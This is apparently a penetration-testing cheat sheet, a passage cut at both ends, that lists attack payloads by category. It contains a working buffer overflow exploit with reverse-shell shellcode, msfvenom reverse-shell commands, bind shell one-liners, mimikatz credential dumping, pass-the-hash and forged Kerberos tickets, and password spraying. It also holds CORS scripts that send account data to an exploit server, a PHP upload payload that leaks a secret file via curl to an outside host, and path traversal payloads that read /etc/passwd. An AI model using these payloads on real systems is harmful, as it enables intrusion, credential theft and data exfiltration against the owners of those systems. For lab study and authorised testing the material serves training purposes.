  first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

  buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
  ```

- **Finding a Return Address:**:
  ```bash
  padding = "\x41" * 4368
  eip = "\x96\x45\x13\x08"
  first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

  buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
  ```
  The EDB debugger comes with a set of plugins, one of which is named OpcodeSearcher. Using this plugin, we can easily search for a JMP ESP instruction or equivalent in the memory
- **Generating a reverse shell**:
  ```bash
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode
  ```

- **Final exploit for the Crossfire application**:
  ```python
  host = "10.11.0.128"

  nop_sled = "\x90" * 8  # NOP sled
  
  shellcode =  ""
  shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
  shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"
  shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"
  shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"
  shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"
  shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"
  shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"
  shellcode += "\x7f\x6d\x02\x36"
  
  padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
  eip = "\x96\x45\x13\x08"  # 0x08134596
  first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
  
  buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
  ```


### Buffer Overflow (BOF) Windows (WIN)
- **BOF Windows Example**:
  ```python
  python -c "print 'A' * 2000" | nc -v 127.0.0.1 80
  ```

- **Reproducing the buffer overflow**:
  ```python
  size = 800
  inputBuffer = "A" * size
  ```
- **Controlling EIP**:
  ```python
  msf-pattern_create -l 800			#Creating a unique string
  msf-pattern_offset -l 800 -q 42306142		#Finding the offset
  ```
- **Updated buffer string**:
  ```python
  filler = "A" * 780
  eip = "B" * 4
  buffer = "C" * 16
  
  inputBuffer = filler + eip + buffer
  ```
- **Locating Space for Our Shellcode**:
  ```python
  filler = "A" * 780
  eip = "B" * 4
  offset = "C" * 4
  buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
  ```
- **Checking for Bad Characters**:
  ```python
  badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
  # other formats:
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

  #other format:
  badchars = b""
  badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" 
  ```
- **Finding the opcode of JMP ESP**:
  ```python
  ali@kali:~$ msf-nasm_shell
  nasm > jmp esp
  00000000  FFE4              jmp esp
  nasm >
  ```
- **Finding a Return Address**:
  ```python
  !mona modules
  !mona find -s "\xff\xe4" -m "libspp.dll"
  ```
- **Redirecting EIP**:
  ```python
   filler = "A" * 780
  eip = "\x83\x0c\x09\x10"		#0x10090c83  the address entered is in reverse order
  offset = "C" * 4
  buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
  
  inputBuffer = filler + eip + offset + buffer
  ```
- **Generating shellcode to use ExitThread**:
  ```python
  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.225 LPORT=443 EXITFUNC=thread -f py  –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7"
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.225 LPORT=443 EXITFUNC=thread -f py -v shellcode  –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7"

  ```

- **final code - getting the shell**:
  ```python
  filler = "A" * 780
  eip = "\x83\x0c\x09\x10"
  offset = "C" * 4
  nops = "\x90" * 10
  
  inputBuffer = filler + eip + offset + nops + shellcode

  ```

- **Python script to fuzz SyncBreeze and identify the length**:
  ```python
  #!/usr/bin/python
  import socket
  import time
  import sys
  
  size = 100
  
  while(size < 2000):
    try:
      print "\nSending evil buffer with %s bytes" % size
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("10.11.0.22", 80))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
    except:
      print "\nCould not connect!"
      sys.exit()
  ```

### Access Control Vulnerabilities
- **Access Control Vulnerability Example**:
  ```bash
  curl -H "Authorization: Bearer <token>" http://example.com/admin
  ```
- **basic tricks to check and bypass ACLs**:
  ```bash
  - Checking the Robots.txt
  - X-Original-URL: /admin/						//Bypass access control with http header	
  - Http-get to http-post						  //Bypass access control rules with changing the http request type
  - Search in Comments/Scripts
  - Search for links with uuid for other users
  - Search for /admin-roles
  - Referer header test to have more permissions (Referer: https://domain/admin)

  ```

### Active Directory (AD)
- **Active Directory Attack Example**:
  ```bash
  ldapsearch -x -b "dc=example,dc=com" "(userPrincipalName=*)" 
  ```
- **Running net user domain command**:
  ```bash
  net user /domain
  net user tester /domain
  ```
- **PowerShell script to enumerate all users(To filter the results: $Searcher.filter="name=tester")**:
  ```bash
  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

  $PDC = ($domainObj.PdcRoleOwner).Name
  
  $SearchString = "LDAP://"
  
  $SearchString += $PDC + "/"
  
  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
  
  $SearchString += $DistinguishedName
  
  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
  
  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
  
  $Searcher.SearchRoot = $objDomain
  
  $Searcher.filter="samAccountType=805306368"
  
  $Result = $Searcher.FindAll()
  
  Foreach($obj in $Result)
  {
      Foreach($prop in $obj.Properties)
      {
          $prop
      }
      
      Write-Host "------------------------"
  }

  ```
- **Modified PowerShell script to enumerate all domain groups**:
  ```bash
  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

  $PDC = ($domainObj.PdcRoleOwner).Name
  
  $SearchString = "LDAP://"
  
  $SearchString += $PDC + "/"
  
  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
  
  $SearchString += $DistinguishedName
  
  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
  
  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
  
  $Searcher.SearchRoot = $objDomain
  
  $Searcher.filter="(objectClass=Group)"
  
  $Result = $Searcher.FindAll()
  
  Foreach($obj in $Result)
  {
      $obj.Properties.name
  } 
  ```
- **PowerShell script to enumerate group members**:
  ```bash
  #Obtaining the members of Nested_Group $Searcher.filter="(name=Nested_Group)"
  #Obtaining the members of Another_Nested_Group $Searcher.filter="(name=Another_Nested_Group)"
  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
  $PDC = ($domainObj.PdcRoleOwner).Name
  
  $SearchString = "LDAP://"
  
  $SearchString += $PDC + "/"
  
  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
  
  $SearchString += $DistinguishedName
  
  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
  
  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
  
  $Searcher.SearchRoot = $objDomain
  
  $Searcher.filter="(name=Secret_Group)"
  
  $Result = $Searcher.FindAll()
  
  Foreach($obj in $Result)
  {
      $obj.Properties.member
  }
 
  ```
- **PowerShell script to detect registered service principal names**:
  ```bash
  #Output: serviceprincipalname    {HTTP/CorpWebServer.corp.com}  --> nslookup CorpWebServer.corp.com
  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
  $PDC = ($domainObj.PdcRoleOwner).Name
  
  $SearchString = "LDAP://"
  $SearchString += $PDC + "/"
  
  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
  
  $SearchString += $DistinguishedName
  
  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
  
  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
  
  $Searcher.SearchRoot = $objDomain
  
  $Searcher.filter="serviceprincipalname=*http*"
  
  $Result = $Searcher.FindAll()
  
  Foreach($obj in $Result)
  {
      Foreach($prop in $obj.Properties)
      {
          $prop
      }
  } 
  ```
- **Authenticating using DirectoryEntry**:
  ```bash
  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
  $PDC = ($domainObj.PdcRoleOwner).Name
  
  $SearchString = "LDAP://"
  $SearchString += $PDC + "/"
  
  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
  
  $SearchString += $DistinguishedName
  
  New-Object System.DirectoryServices.DirectoryEntry($SearchString, "tester", "password")
  ```
- **Using Spray-Passwords.ps1 to attack user accounts**:
  ```bash
  PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass password! -Admin
  Output: WARNING: also targeting admin accounts.
  Performing brute force - press [q] to stop the process and print results...
  Guessed password for user: 'Administrator' = 'password!'
  Guessed password for user: 'tester' = 'password!'
  ```
- **Installing and importing PowerView(User enumeration using Get-NetLoggedon)**:
  ```bash
  Import-Module .\PowerView.ps1
  Get-NetLoggedon -ComputerName client251
  Get-NetSession -ComputerName dc01
  ```
- **Executing mimikatz on a domain workstation(Postexploit)**:
  ```bash
  #Dumping hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions
  #Extracting Kerberos tickets with mimikatz
  mimikatz.exe
  mimikatz # privilege::debug
  mimikatz # sekurlsa::logonpasswords
  mimikatz # sekurlsa::tickets
  mimikatz # kerberos::list /export
  
  #Overpass the Hash
  #Creating a process with a different users NTLM password hash
  mimikatz # sekurlsa::pth /user:tester /domain:corp.com /ntlm:e2b475c11da2dsdfd87aa966c327 /run:PowerShell.exe
  
  #Requesting a service ticket
  #Calling the KerberosRequestorSecurityToken constructor by specifying the SPN with the -ArgumentList option
  Add-Type -AssemblyName System.IdentityModel
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
  
  #Displaying tickets
  PS> klist
  
  #Cracking the ticket
  sudo apt update && sudo apt install kerberoast
  python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
  
  # Passing the hash using pth-winexe
  pth-winexe -U Administrator%aad3b435b51sdfaad3b435b51404ee:2892d26casdfe2eb3b9f05c425e //10.11.0.22 cmd
  
  
  #Opening remote connection using Kerberos
  #PsExec can run a command remotely but does not accept password hashes.
  #Since we have generated Kerberos tickets and operate in the context of tester in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.
  mimikatz# sekurlsa::pth /user:tester /domain:corp.com /ntlm:e2b475c1df748290d87aa966c327 /run:PowerShell.exe
  
  .\PsExec.exe \\dc01 cmd.exe
  
  #Pass the Ticket
  #Creating a silver ticket for the iis_service service account
  mimikatz # kerberos::purge
  Ticket(s) purge for current session is OK
  mimikatz # kerberos::list
  mimikatz # kerberos::golden /user:tester-adm /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
  mimikatz # kerberos::list

  ```
- **Distributed Component Object Model(Code to create DCOM object and enumerate methods)**:
  ```bash
   $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
  $com | Get-Member
  
  #Distributed Component Object Model
  #Proof of concept macro for Excel
  #Copying the Excel document to the remote computer
  #Opening the excel document on the DC
  Sub mymacro()
      Shell ("notepad.exe")
  End Sub
  
  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
  
  $LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
  
  $RemotePath = "\\192.168.1.110\c$\myexcel.xls"
  
  [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
  
  $Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
  
  $temp = [system.io.directory]::createDirectory($Path)
  
  $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
  
  $com.Run("mymacro")
  ```

### Bindshells
- **Bindshell Example**:
  ```bash
  nc -lvp 4444 -e /bin/bash
  ```
- **Bindshell python**:
  ```bash
  python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
  ```

### Brute Force
- **Brute Force Attack Example**:
  ```bash
  hydra -l admin -P /path/to/passwords.txt ssh://target.com
  ```
- **Broken brute-force protection(The trick with multiple credentials per request)**:
  ```bash
  POST Request
  Header
  ...
  
  {"username":"tester","password":["fff",
  "123456",
  "password",
  "12345678",
  "qwerty"]
  ```

### Clickjacking
- **Clickjacking Example**:
  ```html
  <iframe src="http://target.com" width="100%" height="100%" style="opacity: 0.0; position: absolute;"></iframe>
  ```
- **Basic clickjacking with CSRF token protection**:
  ```html
  <style>
    iframe {
        position:relative;
        width:500;
        height:700;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:510;
        left:60;
        z-index: 1;
    }
  </style>
  <div>Click me</div>
  <iframe src="https://0a9200ad03e0c2e7c013191100b1001b.web-security-academy.net/my-account"></iframe>
  ```
- **Exploiting clickjacking vulnerability to trigger DOM-based XSS**:
  ```html
  <iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
  ```

### Cross-Origin Resource Sharing (CORS)
- **CORS Example**:
  ```js
  fetch('http://malicious.com', { method: 'GET', headers: { 'Origin': 'http://malicious.com' } });
  ```
- **CORS basic tricks**:
  ```js
  //Add origin Header
  //Set the Origin Header to arbitrary value
  //Set the Origin Header to null
  //Set the Origin Header to subdomain
  //Change the protocol to http or https
  //Change the original to internal addresses like 127.0.0.1
  ```
- **CORS vulnerability with basic origin reflection**:
  ```js
  HTTP-Request: Header--> Origin: https://example.com
  HTTP-Response:     Access-Control-Allow-Origin: https://example.com
								     Access-Control-Allow-Credentials: true
  ```
- **CORS: Script for the exploit server**:
  ```js
  <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','0aa50072035e6d8fc0ff0df10033008a.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
  </script>
  ```
- **CORS vulnerability with trusted null origin**:
  ```js
  Header--> origin:null
  Exploit Server:
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://0a7200a804a067b4c0714fa20005009a.web-security-academy.net/accountDetails',true);
      req.withCredentials = true;
      req.send();
      function reqListener() {
          location='https://exploit-0ab5005f04b56781c0294f2101440051.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
      };
  </script>"></iframe>
  ```

- **CORS vulnerability with trusted insecure protocols**:
  ```js
  Header --> origin: http://subdomain.lab-ib.burp.net
  Exploit Server:
  <script>
      document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
  </script>
  ```
- **CORS vulnerability with internal network pivot attack**:
  ```js
  1-scan the local network for the endpoint.
  <script>
  var q = [], collaboratorURL = 'http://$collaboratorPayload';
  
  for(i=1;i<=255;i++) {
  	q.push(function(url) {
  		return function(wait) {
  			fetchUrl(url, wait);
  		}
  	}('http://192.168.0.'+i+':8080'));
  }
  
  for(i=1;i<=20;i++){
  	if(q.length)q.shift()(i*100);
  }
  
  function fetchUrl(url, wait) {
  	var controller = new AbortController(), signal = controller.signal;
  	fetch(url, {signal}).then(r => r.text().then(text => {
  		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
  	}))
  	.catch(e => {
  		if(q.length) {
  			q.shift()(wait);
  		}
  	});
  	setTimeout(x => {
  		controller.abort();
  		if(q.length) {
  			q.shift()(wait);
  		}
  	}, wait);
  }
  </script>
  
  2- Replace $ip with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again
  <script>
  function xss(url, text, vector) {
  	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
  }
  
  function fetchUrl(url, collaboratorURL){
  	fetch(url).then(r => r.text().then(text => {
  		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  	}))
  }
  
  fetchUrl("http://$ip", "http://$collaboratorPayload");
  </script>
  3-Clear the code from stage 2 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again
  <script>
  function xss(url, text, vector) {
  	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
  }
  
  function fetchUrl(url, collaboratorURL){
  	fetch(url).then(r=>r.text().then(text=>
  	{
  		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
  	}
  	))
  }
  
  fetchUrl("http://$ip", "http://$collaboratorPayload");
  </script>
  4-Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. 
  
  <script>
  function xss(url, text, vector) {
  	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
  }
  
  function fetchUrl(url){
  	fetch(url).then(r=>r.text().then(text=>
  	{
  	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
  	}
  	))
  }
  
  fetchUrl("http://$ip");
  </script>
  ```


### Cross-Site Request Forgery (CSRF)
- **CSRF Example**:
  ```html
  <img src="http://victim.com/account/change-password?newpassword=1234" />
  ```
- **Basic Considerations for CSRF testing**:
  ```html
  - CSRF protection where token validation depends on the request method
  - CSRF protection where the token is not tied to the user session
  - CSRF protection where the token is tied to a non-session cookie
  - CSRF protection via the addition of the Referer header to bypass header policy
  - CSRF protection where the token is duplicated in the cookie
  <meta name="referrer" content="no-referrer">
  ```

### Database Vulnerabilities (DB)
- **Database enmueration**:
  ```sql
  #Connecting to MariaDB
  mysql --host=127.0.0.1 --port=13306 --user=wp -p
  
  # Displaying user grants
  MariaDB [(none)]> SHOW Grants;
  
  #Showing all variables
  MariaDB [(none)]> show variables;
  ```

### Directory Traversal (DIR)
- **Directory Traversal Payload 1**:
```bash
curl http://example.com/image?filename=../../../../../etc/passwd
```

- **Directory Traversal Payload 2**:
```bash
curl http://example.com/image?filename=/etc/passwd
```

- **Directory Traversal Payload 3**:
```bash
curl http://example.com/image?filename=....//....//....//etc/passwd
```

- **Directory Traversal Payload 4 (URL-encoded 2 times)**:
```bash
curl http://example.com/image?filename=..%252f..%252f..%252fetc/passwd
```

- **Directory Traversal Payload 5**:
```bash
curl http://example.com/image?filename=../../../../../etc/passwd
```

- **Directory Traversal Payload 6 (Validation of Start of Path)**:
```bash
curl http://example.com/image?filename=/var/www/images/../../../etc/passwd
```

- **Directory Traversal Payload 7 (Null Byte Bypass)**:
```bash
curl http://example.com/image?filename=../../../../../etc/passwd%00.png
```


### File Transfer (FTP)
- **FTP Example**:
  ```bash
  ftp -n -v 192.168.1.1
  ```
- **FTP: Downloading all files from FTP**:
  ```bash
  wget -m ftp://anonymous:anonymous@10.10.10.98
  wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
  ```

### File Upload
- **File Upload: Intruder(Some useful extensions)**:
  ```html
  .php
  .jsp
  .php5
  .shtml
  .php.jpg
  .php5.jpg
  %2Ephp
  %2Ephp.jpg
  %2Ephp%2Ejpg
  .asp%00.jpg
  .php%00.jpg
  .p.phphp
  .jpg.php
  xC0x2Ephp
  xC4xAEphp
  xC0xAEphp
  x2Ephp
  xC0x2Ephp.jpg
  xC4xAEphp.jpg
  xC0xAEphp.jpg
  x2Ephp.jpg
  xC0x2Ephp
  xC4xAEphp
  xC0xAEphp
  x2Ephp
  ..%2fexploit.php
  ..%2f..%2fexploit.php
  .htaccess
  ```
- **File Upload: basic tricks**:
  ```html
  #Extension:
  filename="../exploit.php"
  filename="..%2fexploit.php"
  filename="hi.php%00.jpg"
  
  #Magic Bytes
  GIF89a;
  
  #Upload .htaccess
  cat .htaccess 
  AddType application/x-httpd-php .evil
  --> upload php shell as cmd.evil
    
  #Exploit-Payload
  
  <?php echo file_get_contents('/home/carlos/secret'); ?>
  <?php system('curl $(cat /home/carlos/secret).seaepqj8xtjbx8hbbz71kbz6oxuoie63.oastify.com'); ?>

  ```
- **File Upload: exiftool**:
  ```html
  exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

  ```

### File Transfer Protocol (FTP)
- **FTP Example**:
  ```bash
  ftp -n -v 192.168.1.1
  ```

### GraphQL
- **GraphQL Example**:
  ```graphql
  {
    user(id: "1") {
      name
      email
    }
  }
  ```
- **GraphQL Common endpoint names**:
  ```graphql
  /graphql
  /api
  /api/graphql
  /graphql/api
  /graphql/graphql
  /graphql
  /api/v1
  /api/graphql/v1
  /graphql/api/v1
  /graphql/graphql/v1
  ```
- **GraphQL universal query**:
  ```graphql
  /api?query=query{__typename}
  /api/graphql?query=query{__typename}
  ```
- **GraphQL Probing for introspection**:
  ```graphql
   {
        "query": "{__schema{queryType{name}}}"
    }

  ```
- **GraphQL Running a full introspection query 1**:
  ```graphql
  {__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}

  ```

- **GraphQL Running a full introspection query 2**:
  ```graphql
